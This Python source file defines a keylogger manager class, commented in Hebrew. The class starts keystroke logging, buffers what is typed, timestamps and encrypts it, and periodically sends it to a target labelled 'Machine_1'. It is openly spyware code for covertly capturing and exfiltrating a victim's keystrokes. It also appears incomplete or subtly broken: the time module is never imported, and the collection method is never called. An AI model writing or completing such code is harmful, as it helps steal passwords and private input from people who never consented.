class KeyLoggerManager:
    def __init__(self, keylogger_service, file_writer, encryptor, interval=5):
        self.keylogger_service = keylogger_service
        self.file_writer = file_writer
        self.encryptor = encryptor
        self.interval = interval  # כל כמה שניות לאסוף
        self.buffer = []  # מאגר ביניים לשמירת ההקלדות
        self.running = False
    def collect_keys(self):
        keys = self.keylogger_service.get_logged_keys()
        if keys:
            self.buffer.extend(keys)
            self.keylogger_service.clear_logged_keys()  # פונקציה אופציונלית שתאפס את הלוג


    def start(self):
        self.running = True
        self.keylogger_service.start_logging()
        while self.running:
            time.sleep(self.interval)
            self.process_and_send()

    def stop(self):
        self.running = False
        self.process_and_send()  # שולח את מה שנשאר לפני עצירה
        self.keylogger_service.stop_logging()

    def add_timestamp(self, data):
        timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
        return f"[{timestamp}] " + data

    def encrypt_data(self, data):
        return self.encryptor.encrypt(data)

    def process_and_send(self):
        if not self.buffer:
            return
        raw_data = " ".join(self.buffer)
        data_with_time = self.add_timestamp(raw_data)
        encrypted = self.encrypt_data(data_with_time)
        self.file_writer.send_data(encrypted, "Machine_1")
        self.buffer.clear()

    def shutdown(self):
        self.stop()
        print("System stopped. All data saved.")
